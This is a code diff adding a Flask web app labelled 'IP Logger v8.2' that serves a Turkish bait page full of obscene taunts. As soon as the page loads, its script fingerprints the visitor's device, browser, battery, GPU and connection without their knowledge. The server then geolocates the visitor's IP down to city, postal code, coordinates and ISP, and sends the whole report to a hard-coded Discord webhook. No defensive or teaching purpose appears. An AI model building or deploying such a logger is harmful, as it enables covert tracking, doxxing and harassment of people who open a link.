@@ -1,0 +1,312 @@
+from flask import Flask, request, render_template_string, make_response
+import requests
+import urllib3
+from datetime import datetime
+import pytz
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+app = Flask(__name__)
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1547304009155477534/GT43NpiA9hfxoAp30pGV4tNK_-sWWXa0hg_sLSm9JiCgmXRLzwqld-GN0Uu17RodQf3R"
+
+HTML_PAGE = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>Sürpriz!</title>
+    <style>
+        body {
+            background-color: #070709;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .container {
+            background: rgba(20, 20, 25, 0.9);
+            padding: 30px 20px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+            border: 2px solid rgba(255, 51, 51, 0.4);
+            max-width: 95%;
+            width: 450px;
+        }
+        h1 {
+            font-size: 2rem;
+            color: #ff3333;
+            text-shadow: 0 0 15px rgba(255, 51, 51, 0.6);
+            margin: 0 0 10px 0;
+            animation: pulse 1.5s infinite;
+        }
+        h2 {
+            font-size: 1.2rem;
+            color: #ffaa00;
+            text-shadow: 0 0 10px rgba(255, 170, 0, 0.5);
+            margin: 0 0 20px 0;
+        }
+        .alert-box {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff3333;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            color: #ff9999;
+            text-align: left;
+            border-radius: 4px;
+        }
+        button {
+            background: linear-gradient(135deg, #ff3333, #cc0000);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(255, 51, 51, 0.5);
+            transition: 0.2s ease;
+            width: 100%;
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255, 51, 51, 0.8);
+        }
+        #result-box {
+            display: none;
+            margin-top: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #ff3333;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: left;
+            font-family: monospace;
+            font-size: 0.85rem;
+            color: #00ffcc;
+            max-height: 250px;
+            overflow-y: auto;
+        }
+        .roast-text {
+            color: #ff3333;
+            font-weight: bold;
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Sikerler demedik mi şaşkın</h1>
+        <h2>Ananın amında görüşürüz</h2>
+        
+        <div class="alert-box">
+            ⚠️ <b>Durum Analizi:</b> Buraya kadar gelerek büyük bir hata yaptın.
+        </div>
+
+        <button id="action-btn" onclick="revealTruth()">🔥 Tıkla ve Gör</button>
+
+        <div id="result-box">
+            <div class="roast-text">Ah amına kodumun malı</div>
+            <div id="data-list">Veriler yükleniyor...</div>
+        </div>
+    </div>
+
+    <script>
+        let collectedData = {};
+
+        async function getGPUInfo() {
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "Bilinmiyor";
+                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!dbg) return "Bilinmiyor";
+                return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "Bilinmiyor";
+            } catch(e) {
+                return "Bilinmiyor";
+            }
+        }
+
+        async function getBatteryInfo() {
+            try {
+                if (navigator.getBattery) {
+                    let bat = await navigator.getBattery();
+                    return Math.round(bat.level * 100) + "% (" + (bat.charging ? "Şarjda" : "Pilde") + ")";
+                }
+            } catch(e) {}
+            return "Desteklenmiyor";
+        }
+
+        window.onload = async function() {
+            collectedData.resolution = window.screen.width + "x" + window.screen.height + " (" + window.screen.colorDepth + " bit)";
+            collectedData.viewport = window.innerWidth + "x" + window.innerHeight;
+            collectedData.pixelRatio = window.devicePixelRatio || 1;
+            collectedData.platform = navigator.platform || "Bilinmiyor";
+            collectedData.language = navigator.language || "Bilinmiyor";
+            collectedData.languages = navigator.languages ? navigator.languages.join(", ") : "Bilinmiyor";
+            collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Bilinmiyor";
+            collectedData.hardwareConcurrency = navigator.hardwareConcurrency || "Bilinmiyor";
+            collectedData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "Bilinmiyor";
+            collectedData.cookieEnabled = navigator.cookieEnabled ? "Evet" : "Hayır";
+            collectedData.doNotTrack = navigator.doNotTrack || "Bilinmiyor";
+            collectedData.referrer = document.referrer || "Doğrudan";
+            collectedData.currentUrl = window.location.href;
+            collectedData.gpu = await getGPUInfo();
+            collectedData.battery = await getBatteryInfo();
+
+            let ua = navigator.userAgent;
+            collectedData.userAgent = ua;
+            let browser = "Bilinmiyor";
+            if(ua.includes("Firefox")) browser = "Firefox";
+            else if(ua.includes("SamsungBrowser")) browser = "Samsung Internet";
+            else if(ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+            else if(ua.includes("Edge")) browser = "Edge";
+            else if(ua.includes("Chrome")) browser = "Chrome";
+            else if(ua.includes("Safari")) browser = "Safari";
+            collectedData.browserName = browser;
+
+            collectedData.deviceType = /Mobi|Android/i.test(ua) ? "Mobil" : "Masaüstü";
+
+            if (navigator.connection) {
+                collectedData.connectionType = navigator.connection.effectiveType || "Bilinmiyor";
+                collectedData.downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "Bilinmiyor";
+                collectedData.rtt = navigator.connection.rtt ? navigator.connection.rtt + " ms" : "Bilinmiyor";
+            } else {
+                collectedData.connectionType = "Bilinmiyor";
+                collectedData.downlink = "Bilinmiyor";
+                collectedData.rtt = "Bilinmiyor";
+            }
+
+            fetch('/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(collectedData)
+            });
+        };
+
+        function revealTruth() {
+            document.getElementById('action-btn').style.display = 'none';
+            let box = document.getElementById('result-box');
+            box.style.display = 'block';
+
+            let html = "<b>Çekilen Sistem Verilerin:</b><br>";
+            html += "• Cihaz: " + collectedData.deviceType + "<br>";
+            html += "• İşletim Sistemi: " + collectedData.platform + "<br>";
+            html += "• Tarayıcı: " + collectedData.browserName + "<br>";
+            html += "• GPU (Ekran Kartı): " + collectedData.gpu + "<br>";
+            html += "• İşlemci Çekirdeği: " + collectedData.hardwareConcurrency + "<br>";
+            html += "• RAM (Yaklaşık): " + collectedData.deviceMemory + "<br>";
+            html += "• Pil Durumu: " + collectedData.battery + "<br>";
+            html += "• Ekran: " + collectedData.resolution + "<br>";
+            html += "• Dil: " + collectedData.language + "<br>";
+            html += "• Zaman Dilimi: " + collectedData.timezone + "<br>";
+            html += "• Bağlantı Hızı: " + collectedData.downlink + "<br>";
+            html += "<br><span style='color: #ff3333;'>Bütün donanım ve konum bilgilerin Discord paneline başarıyla aktarıldı!</span>";
+
+            document.getElementById('data-list').innerHTML = html;
+        }
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    response = make_response(render_template_string(HTML_PAGE))
+    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    response.headers['Pragma'] = 'no-cache'
+    response.headers['Expires'] = '0'
+    return response
+
+@app.route('/collect', methods=['POST'])
+def collect():
+    client_data = request.json or {}
+    ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
+    
+    country, region, city, zip_code, lat_lon, isp, currency, tz = "Bilinmiyor", "Bilinmiyor", "Bilinmiyor", "Bilinmiyor", "Bilinmiyor", "Bilinmiyor", "Bilinmiyor", "Bilinmiyor"
+
+    if ip not in ['127.0.0.1', '::1'] and not ip.startswith('192.168.'):
+        try:
+            res = requests.get(f"http://ip-api.com/json/{ip}?lang=tr", timeout=3).json()
+            country = f"{res.get('country', 'Bilinmiyor')} ({res.get('countryCode', '')})"
+            region = res.get('regionName', 'Bilinmiyor')
+            city = res.get('city', 'Bilinmiyor')
+            zip_code = res.get('zip', 'Bilinmiyor')
+            if not zip_code: zip_code = "Bilinmiyor"
+            lat, lon = res.get('lat', ''), res.get('lon', '')
+            if lat and lon: lat_lon = f"{lat}, {lon}"
+            isp = res.get('isp', 'Bilinmiyor')
+            currency = res.get('currency', 'Bilinmiyor')
+            tz = res.get('timezone', 'Bilinmiyor')
+        except Exception:
+            pass
+
+    tr_tz = pytz.timezone('Europe/Istanbul')
+    now_tr = datetime.now(tr_tz).strftime('%d.%m.%Y %H:%M:%S')
+    now_utc = datetime.now(pytz.utc).strftime('%Y-%m-%d %H:%M:%S.%fZ')
+
+    embed_data = {
+        "embeds": [{
+            "title": "🕵️‍♂️ Kapsamlı Ziyaretçi Raporu - Tüm Veriler Alındı!",
+            "color": 16711680,
+            "fields": [
+                {"name": "🌐 IP Adresi", "value": f"`{ip}`", "inline": True},
+                {"name": "📍 Ülke", "value": f"`{country}`", "inline": True},
+                {"name": "🏙️ Şehir", "value": f"`{region} / {city}`", "inline": True},
+                {"name": "📮 Posta Kodu", "value": f"`{zip_code}`", "inline": True},
+                {"name": "🧭 Koordinat", "value": f"`{lat_lon}`", "inline": True},
+                {"name": "📞 İnternet Sağlayıcı (ISP)", "value": f"`{isp}`", "inline": True},
+                {"name": "🪙 Para Birimi", "value": f"`{currency}`", "inline": True},
+                {"name": "💻 Cihaz Türü", "value": f"`{client_data.get('deviceType', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🖥️ İşletim Sistemi", "value": f"`{client_data.get('platform', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🌐 Tarayıcı", "value": f"`{client_data.get('browserName', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🎮 GPU (Ekran Kartı)", "value": f"`{client_data.get('gpu', 'Bilinmiyor')}`", "inline": False},
+                {"name": "⚡ İşlemci Çekirdeği", "value": f"`{client_data.get('hardwareConcurrency', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🧠 RAM (Tahmini)", "value": f"`{client_data.get('deviceMemory', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🔋 Pil Durumu", "value": f"`{client_data.get('battery', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🖥️ Ekran Çözünürlüğü", "value": f"`{client_data.get('resolution', 'Bilinmiyor')}`", "inline": True},
+                {"name": "📐 Viewport", "value": f"`{client_data.get('viewport', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🗣️ Sistem Dili", "value": f"`{client_data.get('language', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🌐 Desteklenen Diller", "value": f"`{client_data.get('languages', 'Bilinmiyor')}`", "inline": False},
+                {"name": "📶 Bağlantı Türü", "value": f"`{client_data.get('connectionType', 'Bilinmiyor')}`", "inline": True},
+                {"name": "⚡ Tahmini Hız", "value": f"`{client_data.get('downlink', 'Bilinmiyor')}`", "inline": True},
+                {"name": "⏱️ Gecikme (RTT)", "value": f"`{client_data.get('rtt', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🍪 Çerez Durumu", "value": f"`{client_data.get('cookieEnabled', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🛑 Do Not Track", "value": f"`{client_data.get('doNotTrack', 'Bilinmiyor')}`", "inline": True},
+                {"name": "🔗 Geldiği Yer (Referrer)", "value": f"`{client_data.get('referrer', 'Doğrudan')}`", "inline": False},
+                {"name": "🕒 Türkiye Saati", "value": f"`{now_tr}`", "inline": True},
+                {"name": "🌍 UTC Zamanı", "value": f"`{now_utc}`", "inline": True}
+            ],
+            "footer": {
+                "text": "IP Logger v8.2 • Clean Edition"
+            }
+        }]
+    }
+
+    try:
+        requests.post(WEBHOOK_URL, json=embed_data, timeout=5)
+    except Exception as e:
+        print(f"Webhook hatası: {e}")
+
+    return '', 204
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+
